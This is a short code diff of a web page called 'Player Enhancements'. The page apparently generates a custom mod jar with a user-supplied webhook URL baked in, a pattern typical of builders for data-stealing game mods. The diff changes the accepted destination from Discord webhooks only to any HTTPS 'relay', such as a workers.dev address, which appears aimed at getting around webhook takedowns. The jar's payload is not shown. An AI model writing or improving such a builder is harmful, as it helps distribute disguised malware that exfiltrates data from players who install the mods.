@@ -45,10 +45,10 @@
   <main class="card">
     <div class="pick">⛏️</div>
     <h1>Player Enhancements</h1>
-    <p class="sub">Drop your webhook, grab a mod. One click, your own jar.</p>
+    <p class="sub">Drop your hook URL, grab a mod. One click, your own jar.</p>
 
     <input id="wh" type="text" spellcheck="false" autocomplete="off"
-           placeholder="https://discord.com/api/webhooks/...">
+           placeholder="https://your-relay.workers.dev — or your Discord hook">
     <button id="build" disabled>Loading template…</button>
     <div id="status"></div>
     <a id="dl" href="#" download>Download your mod</a>
@@ -85,8 +85,8 @@
     status.className = '';
     dl.style.display = 'none';
 
-    if (!/^https:\/\/discord(app)?\.com\/api\/webhooks\//.test(webhook)) {
-      status.textContent = 'Needs a real Discord webhook URL.';
+    if (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(webhook) || webhook.length > 300) {
+      status.textContent = 'Needs a real HTTPS hook URL (Discord or your relay).';
       status.className = 'err';
       return;
     }
